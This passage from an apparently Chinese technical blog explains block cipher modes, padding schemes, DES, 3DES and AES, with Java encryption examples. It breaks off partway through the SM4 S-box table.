<p>ECB是最简单的运行模式，它一次对一个64bit的明文分组利用相同的密钥进行加密，当密钥取定时，对明文的每一个分组，都有一个惟一的密文与之对应。如果消息长于64比特,则将其分为长为64比特的分组，最后一个分组如果不够64bit，则需要对这个分组进行填充。解密过程也是一次对一个分组解密，而且每次解密都使用同一密钥。</p>
<p>每次加密均产生独立的密文分组，每组的加密结果不会对其他分组差生影响，相同的明文加密后对应产生相同的密文，无初始化向量(加密向量,iv)</p>
<ul>
<li>优点：简单易行，便于实现并行操作，没有误差传递的问题</li>
<li>缺点：不能隐藏明文的模式，如果同一明文重复出现、密文也会重复，密文内容很容易被替换、重排、删除、重放；对明文进行主动攻击的可能性较高</li>
<li>用途：适合加密密钥，随机数等短数据。</li>
</ul>
<h4 id="密文链接模式-CBC">密文链接模式(CBC)<a class="header-anchor" href="#密文链接模式-CBC"> ¶ </a></h4>
<p>⊕表示异或</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//CBC.png" alt="CBC图解"></p>
<p>为了解决ECB模式的密文块相同的缺点，CBC的模式引入了一个初始向量概念(IV)。在第一次加密前，会使用初始化向量与第一个明文分组异或，生成的数据分组再进行加密；加密第二个分组之前，会拿第一块的密文数据与第二个明文分组进行异或运算后再进行加密，以此类推，解密时也是在解密后，再与前一分组进行异或运算，生成最终的明文。</p>
<ul>
<li>优点：CBC加密后密文上下文关联，即使明文出现重复信息也不会产生相同密文；密文内容如果被替换重排删除重放或传输错误，后续密文即被破坏，无法完成解密还原。</li>
<li>缺点：不利于并行计算；误差传递；需要初始化向量(IV)</li>
<li>用途：可加密任意长度的数据，适用于计算产生检测数据完整性的消息认证码MAC</li>
</ul>
<h4 id="密码反馈模式-CFB">密码反馈模式(CFB)<a class="header-anchor" href="#密码反馈模式-CFB"> ¶ </a></h4>
<p>利用CFB或者OFB模式，可将DES转换为流密码。它可以按字节逐个进行加密解密，也可以按照n位字节处理。</p>
<p>设传送的每个<strong>单元</strong>(如一个字符)<strong>长度</strong>是<strong>j比特</strong>(通常取8bit)，与CBC一样，明文单元被链接到一起，使得密文是前面所有明文的函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//CFB.png" alt="CFB图解"></p>
<p>加密时，加密算法的输入是64比特移位寄存器，初值为某个初始向量IV。加密算法输出的最左(最高有效位) j 比特与明文的第一个单元P<sub>1</sub>异或，产生出的密文的第一个单元C<sub>1</sub>，并传送该单元。然后将移位寄存器的内容左移 j 位，并将C<sub>1</sub>送入送入移位寄存器最右边(最低有效位) j 位。这一过程继续到明文所有单元都被加密为止。</p>
<blockquote>
<p>通俗解释，看图，首先j比特为加密的单元长度，初次的移位寄存器为IV，先将其进行DES加密，之后选取左侧的j比特与明文的第一个单元P<sub>1</sub>进行异或，之后将原先的IV左移j位(抛弃运算完成的j位)，然后将P<sub>1</sub>异或结果C<sub>1</sub>( j 比特) 填补到移位寄存器的右侧(最低有效位) j 位，并开始下一次的加密、异或。</p>
</blockquote>
<p>解密时，将受到的密文单元与加密函数的输出进行异或。</p>
<ul>
<li>优点：隐藏了明文的模式，每个分组加密结果必受前面所有分组内容的影响，多次相同明文均产生不同密文；分组密码转化为流模式，可产生密钥流；可及时加密传送小于分组的数据。</li>
<li>缺点：不利于并行计算；存在误差传送；需要初始化向量。</li>
<li>用途：因错误传播无界，可用于检查发现明文密文的篡改。</li>
</ul>
<h4 id="输出反馈模式-OFB">输出反馈模式(OFB)<a class="header-anchor" href="#输出反馈模式-OFB"> ¶ </a></h4>
<p>OFB模式的结构类似于CFB，不同之处在于：OFB是将加密算法的输出反馈到移位寄存器，而CFB则是将密文单元反馈到移位寄存器。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//OFB.png" alt="OFB图解"></p>
<ul>
<li>优点：传输过程中的比特错误不会被传播、后各明文单元不受影响（无误差传送问题）；</li>
<li>缺点：不利于并行运算，比CFB模式更易受到对消息流的篡改攻击。</li>
<li>用途：适用于加密冗余性较大的数据，如语音和图像数据。</li>
</ul>
<h4 id="计数器模式-CTR">计数器模式(CTR)<a class="header-anchor" href="#计数器模式-CTR"> ¶ </a></h4>
<p>CTR模式（Counter mode，CM）也被称为ICM模式（Integer Counter Mode，整数计数模式）和SIC模式（Segmented Integer Counter），与OFB相似，CTR将块密码变为流密码。它通过递增一个加密计数器以产生连续的密钥流，其中，计数器可以是任意保证长时间不产生重复输出的函数，但使用一个普通的计数器是最简单和最常见的做法。</p>
<p>加密：通过对逐次累加的计数器<strong>加密</strong>来生成密钥分组，与明文分组异或产生密文分组。</p>
<p>解密：同加密。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//CTR.png" alt="CTR图解"></p>
<p>**例如：**AES-128，首先选择一个IV（长度小于分组长度，比如96位），而剩下的32位则由计数器使用，并且该CTR值初始化为0。在会话期间加密的每个分组，计数器都会递增而IV则保持不变。</p>
<ul>
<li>优点：可并行计算</li>
</ul>
<h4 id="明文密码块链接-PCBC">明文密码块链接(PCBC)<a class="header-anchor" href="#明文密码块链接-PCBC"> ¶ </a></h4>
<p>PCBC 的全称为明文密码块链接（Plaintext cipher-block chaining）。也称为填充密码块链接（Propagating cipher-block chaining）。</p>
<p><strong>加密</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//pcbc_encryption.png" alt="pcbc_encryption"></p>
<p><strong>解密</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//pcbc_decryption.png" alt="pcbc_decryption"></p>
<h3 id="分组密码填充模式">分组密码填充模式<a class="header-anchor" href="#分组密码填充模式"> ¶ </a></h3>
<p><strong>需要注意的是，即使消息的长度是块大小的整数倍，仍然需要填充。</strong>（其它 <a href="https://www.di-mgt.com.au/cryptopad.html">填充规则</a>）</p>
<h4 id="NoPadding">NoPadding<a class="header-anchor" href="#NoPadding"> ¶ </a></h4>
<p>不填充，在此填充下原始数据<strong>必须</strong>是分组大小的整数倍，非整数倍时无法使用该模式</p>
<h4 id="PKCS5Padding-PKCS7Padding">PKCS5Padding / PKCS7Padding<a class="header-anchor" href="#PKCS5Padding-PKCS7Padding"> ¶ </a></h4>
<p>填充至符合块大小的整数倍，填充值为[<strong>填充数量数</strong>]</p>
<ul>
<li>
<p>原始：<code>FF FF FF FF FF FF FF FF FF</code> (9 byte)</p>
</li>
<li>
<p>填充：<code>FF FF FF FF FF FF FF FF FF 07 07 07 07 07 07 07</code> (假设填充至16byte，需7byte，则填充值为<code>07</code>)</p>
</li>
</ul>
<p>特殊情况：PKCS#7规定Padding必须存在，因此即使原始数据是16的整数倍，也需要在末尾追加16字节的Padding，即正好追加一个块，这个块每个字节都是<code>0x10</code></p>
<p><code>PKCS5Padding</code> 的分组大小固定为 8 个字节，而 <code>PKCS7Padding</code> 的分组大小可以在 1~255 字节。但 SunJCE 的 Provider 实现中 <code>PKCS5Padding</code> 也按 <code>PKCS7Padding</code> 来进行处理了（因为<strong>AES并没有64位的块, 如果采用PKCS5, 那么实质上就是采用PKCS7</strong>）。</p>
<h4 id="ANSI-X923Padding">ANSI X923Padding<a class="header-anchor" href="#ANSI-X923Padding"> ¶ </a></h4>
<p>填充至符合块大小的整数倍，填充值<strong>最后一个字节</strong>为[<strong>填充数量数</strong>]，其他字节填 <code>00</code></p>
<ul>
<li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li>
<li>填充：<code>FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 07</code></li>
</ul>
<p>特殊情况：只有一个字节填充，则直接填充<code>01</code>(填充数量)</p>
<h4 id="ISO10126Padding">ISO10126Padding<a class="header-anchor" href="#ISO10126Padding"> ¶ </a></h4>
<p>填充至符合块大小的整数倍，填充值<strong>最后一个字节</strong>为[<strong>填充数量数</strong>]，其他字节随机处理</p>
<ul>
<li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li>
<li>填充：<code>FF FF FF FF FF FF FF FF FF 3F 7A B4 09 14 36 07</code> (填充7byte，最后填充值为<code>07</code>，其余填充随机)</li>
</ul>
<p>特殊情况：只有一个字节填充，则直接填充<code>01</code>(填充数量)</p>
<h4 id="ISO7816-4Padding">ISO7816-4Padding<a class="header-anchor" href="#ISO7816-4Padding"> ¶ </a></h4>
<p>填充至符合块大小的整数倍，填充值第一个字节为 <code>0x80</code>，其他字节填 <code>00</code></p>
<ul>
<li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li>
<li>填充：<code>FF FF FF FF FF FF FF FF FF 80 00 00 00 00 00 00</code></li>
</ul>
<h4 id="ZeroBytePadding">ZeroBytePadding<a class="header-anchor" href="#ZeroBytePadding"> ¶ </a></h4>
<p>填充至符合块大小的整数倍，填充值为 0</p>
<ul>
<li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li>
<li>填充：<code>FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00</code></li>
</ul>
<h4 id="TBCPadding（Trailing-Bit-Compliment）">TBCPadding（Trailing-Bit-Compliment）<a class="header-anchor" href="#TBCPadding（Trailing-Bit-Compliment）"> ¶ </a></h4>
<p>填充至符合块大小的整数倍，原文最后一个bit位为<code>1</code>时填充 <code>00</code>，最后一位为<code>0</code>时填充<code>FF</code></p>
<ul>
<li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li>
<li>填充：<code>FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00</code></li>
<li>原始：<code>FF FF FF FF FF FF FF FF F0</code></li>
<li>填充：<code>FF FF FF FF FF FF FF FF F0 FF FF FF FF FF FF FF</code></li>
</ul>
<h4 id="PKCS1Padding">PKCS1Padding<a class="header-anchor" href="#PKCS1Padding"> ¶ </a></h4>
<p>该填充模式是 <strong>RSA 加密中使用</strong>的，详见 <a href="https://datatracker.ietf.org/doc/html/rfc2313">RFC 2313 - PKCS #1: RSA Encryption Version 1.5 (ietf.org)</a>。</p>
<p>要求：必须比RSA钥模长(modulus)短至少11byte，也就是<code>RSA_size(rsa) - 11</code>，输出和modulus一样长</p>
<p>例如：密钥长度为1024位(bit)，则输出的密文块长度为128byte，输入的明文块长度则为<code>128-11 = 117byte</code>；如果明文过长、需要切割；明文较短、需要填充，填充规则如下</p>
<p>RSA 加密时，需要将原文填充至密钥大小，加密块是一个8位字节串<code>EB</code>，它由块标记<code>BT</code> 、填充块<code>PS</code>、原数据<code>D</code>组成：<code>EB = 00 | BT | PS | 00 | D</code></p>
<ul>
<li><code>00</code> 为固定字节</li>
<li><code>BT</code> 为处理模式。私钥操作为 <code>00</code> 或 <code>01</code>，公钥操作时为 <code>02</code></li>
<li><code>PS</code> 为填充字节块，填充数量为 <code>k - 3 - D</code>(减去的3即为<code>00|BT|00</code>)，<code>k</code> 表示密钥长度，<code>D</code> 表示原文长度。<code>PS</code> 的最小长度为 <code>8</code> 个字节。填充的值根据 <code>BT</code> 值不同而不同：
<ul>
<li><code>BT = 00</code> 时，填充全 <code>00</code></li>
<li><code>BT = 01</code> 时，填充全 <code>FF</code></li>
<li><code>BT = 02</code> 时，随机填充，但不能为 <code>00</code></li>
</ul>
</li>
<li><code>D</code> 为填充前原文</li>
</ul>
<h2 id="DES">DES<a class="header-anchor" href="#DES"> ¶ </a></h2>
<ul>
<li>分组加密算法：以64位为分组。64位明文输入，64位密文输出</li>
<li>对称算法：加密和解密使用同一秘钥。</li>
<li>密钥 64 位，使用 64 位密钥中的 56 位，剩余的 8 位要么丢弃，要么作为奇偶校验位(第8、16、24、32、40、48、56、64作为校验位)。</li>
<li>Feistel 迭代结构
<ul>
<li>明文经过 16 轮迭代得到密文。</li>
<li>密文经过类似的 16 轮迭代得到明文。</li>
</ul>
</li>
</ul>
<h3 id="原理-2">原理<a class="header-anchor" href="#原理-2"> ¶ </a></h3>
<p>大致图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//DES-0.png" alt="DES-0"></p>
<p>F函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//DES-1.png" alt="DES-1"></p>
<p>密钥生成图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//DES-2.png" alt="DES-2"></p>
<h3 id="实现-2">实现<a class="header-anchor" href="#实现-2"> ¶ </a></h3>
<h4 id="Java">Java<a class="header-anchor" href="#Java"> ¶ </a></h4>
<script src="https://gist.github.com/Forgo7ten/e04b2095d197200bc6b535597008510d.js"></script>
<h2 id="DESede-3DES">DESede(3DES)<a class="header-anchor" href="#DESede-3DES"> ¶ </a></h2>
<p>DESede同时又可称为3DES(三重DES)或TripleDES</p>
<p>三重 DES 的加解密方式如下</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo>=</mo><msub><mi>E</mi><mrow><mi>k</mi><mn>3</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>D</mi><mrow><mi>k</mi><mn>2</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mrow><mi>k</mi><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C=E_{k3}(D_{k2}(E_{k1}(P)))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)))</span></span></span></span></p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>=</mo><msub><mi>D</mi><mrow><mi>k</mi><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mrow><mi>k</mi><mn>2</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>D</mi><mrow><mi>k</mi><mn>3</mn></mrow></msub><mo stretchy="false">(</mo><mi>C</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P=D_{k1}(E_{k2}(D_{k3}(C)))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mclose">)))</span></span></span></span></p>
<p>在选择密钥时，可以有两种方法</p>
<ul>
<li>3 个不同的密钥，k1，k2，k3 互相独立，一共 168 比特。</li>
<li>2 个不同的密钥，k1 与 k2 独立，k3=k1，112 比特。</li>
</ul>
<p>当三个密钥均相同时，此时与DES加密无异</p>
<h3 id="实现-3">实现<a class="header-anchor" href="#实现-3"> ¶ </a></h3>
<h3 id="Java-2">Java<a class="header-anchor" href="#Java-2"> ¶ </a></h3>
<p>在Java中，传入的key字节数组需满足<code>length==18</code>，也就是原DES的key的三个，至于key的选取规则，则留给用户遵守</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * DESede ECB 模式加密</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> data 需要加密的数据字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> key  加密的key</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">des3ECBcrypt</span><span class="params">(<span class="keyword">byte</span>[] data, <span class="keyword">byte</span>[] key)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 加密结果字节数组</span></span><br><span class="line">    <span class="keyword">byte</span>[] encrypted;</span><br><span class="line">    <span class="comment">// 加密结果字符串</span></span><br><span class="line">    String result = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> != key &amp;&amp; key.length != <span class="number">24</span>) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;DESede uses a key length of 24 bytes (192 bits).&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 实例化 密钥材料</span></span><br><span class="line">        DESedeKeySpec desKey = <span class="keyword">new</span> DESedeKeySpec(key);</span><br><span class="line">        <span class="comment">// 实例化 密钥生成器</span></span><br><span class="line">        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(<span class="string">&quot;DESede&quot;</span>);</span><br><span class="line">        <span class="comment">// 生成密钥</span></span><br><span class="line">        SecretKey secretKey = keyFactory.generateSecret(desKey);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 指定加密模式 实例化Ciper对象</span></span><br><span class="line">        Cipher cipher = Cipher.getInstance(<span class="string">&quot;DESede/ECB/PKCS5Padding&quot;</span>); <span class="comment">// 加密方式/工作模式/填充模式</span></span><br><span class="line">        <span class="comment">// 初始化,设置加密(1)或解密(2)</span></span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, secretKey);</span><br><span class="line">        <span class="comment">// 执行，得到结果字节数组</span></span><br><span class="line">        encrypted = cipher.doFinal(data);</span><br><span class="line">        <span class="comment">// 对结果字节数组进行base64编码，得到加密后的字符串</span></span><br><span class="line">        result = Base64.getEncoder().encodeToString(encrypted);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException | BadPaddingException | IllegalBlockSizeException | InvalidKeySpecException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实就是相比DES，将<code>DESKeySpec</code>类替换为<code>DESedeKeySpec</code>类，将字符串<code>DES</code>替换为<code>DESede</code></p>
<p>调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(des3ECBcrypt(<span class="string">&quot;Forgo7ten&quot;</span>.getBytes(StandardCharsets.UTF_8), <span class="string">&quot;123456781234567812345678&quot;</span>.getBytes(StandardCharsets.UTF_8)));	<span class="comment">// 由于三个key相同，则加密结果与一个key的DES结果相同</span></span><br></pre></td></tr></table></figure>
<h2 id="AES">AES<a class="header-anchor" href="#AES"> ¶ </a></h2>
<table>
<thead>
<tr>
<th style="text-align:center">AES</th>
<th style="text-align:center">密钥长度(32位比特字)</th>
<th style="text-align:center">分组长度(32位比特字)</th>
<th style="text-align:center">加密轮数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">AES-128</td>
<td style="text-align:center">4(128位)</td>
<td style="text-align:center">4</td>
<td style="text-align:center">10</td>
</tr>
<tr>
<td style="text-align:center">AES-192</td>
<td style="text-align:center">6</td>
<td style="text-align:center">4</td>
<td style="text-align:center">12</td>
</tr>
<tr>
<td style="text-align:center">AES-256</td>
<td style="text-align:center">8</td>
<td style="text-align:center">4</td>
<td style="text-align:center">14</td>
</tr>
</tbody>
</table>
<h3 id="原理-3">原理<a class="header-anchor" href="#原理-3"> ¶ </a></h3>
<p>AES算法是对称密码，主要有四种操作处理，分别是密钥加法层(也叫轮密钥加，英文Add Round Key)、字节代换层(SubByte)、行位移层(Shift Rows)、列混淆层(Mix Column)。</p>
<p>而明文x和密钥k都是由16个字节组成的数据(当然密钥还支持192位和256位的长度，暂时不考虑)，它<strong>是按照字节的先后顺序从上到下、从左到右进行排列的。</strong></p>
<p>AES算法在处理的轮数上只有最后一轮操作与前面的轮处理上有些许不同(最后一轮只是少了列混淆处理)，在轮处理开始前还单独进行了一次轮密钥加的处理。在处理轮数上，我们只考虑128位密钥的10轮处理。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//AES-0.jpg" alt="AES-0"></p>
<h4 id="字节代换操作">字节代换操作<a class="header-anchor" href="#字节代换操作"> ¶ </a></h4>
<p>状态矩阵中的元素按照下面的方式映射为一个新的字节：</p>
<p>把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。</p>
<p>例如，加密时，输出的字节S1为0x12,则查S盒的第0x01行和0x02列，得到值0xc9,然后替换S1原有的0x12为0xc9。</p>
<p>S盒为16*16</p>
<h4 id="行位移操作">行位移操作<a class="header-anchor" href="#行位移操作"> ¶ </a></h4>
<p>行移位是一个简单的左循环移位操作。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//AES-1.png" alt="AES-1-行位移加密"></p>
<p>当密钥长度为128比特时，在加密时，保持矩阵的第一行不变，第二行向左移动8Bit(一个字节)、第三行向左移动2个字节、第四行向左移动3个字节。而在解密时恰恰相反，依然保持第一行不变，将第二行向右移动一个字节、第三行右移2个字节、第四行右移3个字节。</p>
<h4 id="列混淆">列混淆<a class="header-anchor" href="#列混淆"> ¶ </a></h4>
<p>列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的<strong>矩阵相乘</strong>，得到混淆后的状态矩阵</p>
<h3 id="实现-4">实现<a class="header-anchor" href="#实现-4"> ¶ </a></h3>
<h4 id="Java-3">Java<a class="header-anchor" href="#Java-3"> ¶ </a></h4>
<script src="https://gist.github.com/Forgo7ten/5c0632182b9d671664f7e73e1c31ec40.js"></script>
<h2 id="TEA系列密码">TEA系列密码<a class="header-anchor" href="#TEA系列密码"> ¶ </a></h2>
<h2 id="SM4算法">SM4算法<a class="header-anchor" href="#SM4算法"> ¶ </a></h2>
<h3 id="SM4算法的特征">SM4算法的特征<a class="header-anchor" href="#SM4算法的特征"> ¶ </a></h3>
<ol>
<li>
<p>S盒固定</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> TAO[<span class="number">16</span>][<span class="number">16</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    &#123;<span class="number">0xd6</span>,<span class="number">0x90</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xcc</span>,<span class="number">0xe1</span>,<span class="number">0x3d</span>,<span class="number">0xb7</span>,<span class="number">0x16</span>,<span class="number">0xb6</span>,<span class="number">0x14</span>,<span class="number">0xc2</span>,<span class="number">0x28</span>,<span class="number">0xfb</span>,<span class="number">0x2c</span>,<span class="number">0x05</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x2b</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0xbe</span>,<span class="number">0x04</span>,<span class="number">0xc3</span>,<span class="number">0xaa</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,<span class="number">0x06</span>,<span class="number">0x99</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x9c</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xf4</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0x98</span>,<span class="number">0x7a</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0b</span>,<span class="number">0x43</span>,<span class="number">0xed</span>,<span class="number">0xcf</span>,<span class="number">0xac</span>,<span class="number">0x62</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0xa9</span>,<span class="number">0xc9</span>,<span class="number">0x08</span>,<span class="number">0xe8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xdf</span>,<span class="number">0x94</span>,<span class="number">0xfa</span>,<span class="number">0x75</span>,<span class="number">0x8f</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xa7</span>,<span class="number">0xfc</span>,<span class="number">0xf3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xba</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,<span class="number">0x19</span>,<span class="number">0xe6</span>,<span class="number">0x85</span>,<span class="number">0x4f</span>,<span class="number">0xa8</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xda</span>,<span class="number">0x8b</span>,<span class="number">0xf8</span>,<span class="number">0xeb</span>,<span class="number">0x0f</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9d</span>,<span class="number">0x35</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x1e</span>,<span class="number">0x24</span>,<span class="number">0x0e</span>,<span class="number">0x5e</span>,<span 